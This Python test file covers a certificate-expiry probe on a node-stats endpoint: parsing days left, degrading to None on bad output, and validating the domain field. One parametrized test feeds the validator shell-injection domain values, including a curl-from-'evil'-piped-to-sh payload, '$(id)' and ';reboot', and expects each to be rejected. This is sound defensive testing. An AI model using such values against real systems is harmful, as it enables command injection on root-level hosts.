"""Ф7 — cert-expiry probe on the node-stats endpoint (degrades, never raises)."""
import asyncio

import pytest
from pydantic import ValidationError

from app.api.stats import _cert_expiry, CertInfo, NodeStatsRequest


class _SSH:
    """Fake SSHSession returning a canned `get_output` result."""
    def __init__(self, out: str):
        self._out = out

    async def get_output(self, _script: str) -> str:
        return self._out


def _probe(out: str, domain: str = "n.example.com"):
    return asyncio.run(_cert_expiry(_SSH(out), domain))


def test_parses_delta_seconds_to_floored_days_and_notafter():
    # 43 days + 5h of seconds → floors to 43
    r = _probe(f"{43 * 86400 + 5 * 3600}|Jul 15 12:00:00 2026 GMT")
    assert isinstance(r, CertInfo)
    assert r.daysLeft == 43
    assert r.notAfter == "Jul 15 12:00:00 2026 GMT"


def test_just_expired_floors_to_negative_not_zero():
    # expired 3 hours ago → floor(-10800/86400) == -1 (not 0 as bash trunc would give)
    r = _probe("-10800|Jan 01 00:00:00 2020 GMT")
    assert r.daysLeft == -1


def test_expired_cert_reports_negative_days():
    r = _probe(f"{-5 * 86400}|Jan 01 00:00:00 2020 GMT")
    assert r.daysLeft == -5


def test_empty_domain_skips_probe():
    # no domain → None without touching SSH
    assert asyncio.run(_cert_expiry(_SSH("irrelevant"), "")) is None
    assert asyncio.run(_cert_expiry(_SSH("irrelevant"), "   ")) is None


def test_missing_cert_returns_none():
    # script emits nothing when the cert file is absent
    assert _probe("") is None
    assert _probe("\n") is None


def test_malformed_output_degrades_to_none():
    assert _probe("garbage no pipe") is None
    assert _probe("notanumber|Jul 15 2026") is None  # delta not an int


# ── domain shell-safety: reaches a root SSH script in _cert_expiry ──

@pytest.mark.parametrize("bad", [
    'x";curl evil|sh;"', "x$(id)", "n.example.com`id`", "a b.com", "n.evil.com;reboot",
])
def test_domain_rejects_shell_metacharacters(bad):
    with pytest.raises(ValidationError):
        NodeStatsRequest(ip="1.2.3.4", ssh_password="pw", domain=bad)


def test_domain_empty_and_valid_accepted():
    NodeStatsRequest(ip="1.2.3.4", ssh_password="pw", domain="")           # haproxy: skip
    NodeStatsRequest(ip="1.2.3.4", ssh_password="pw", domain="node1.example.com")
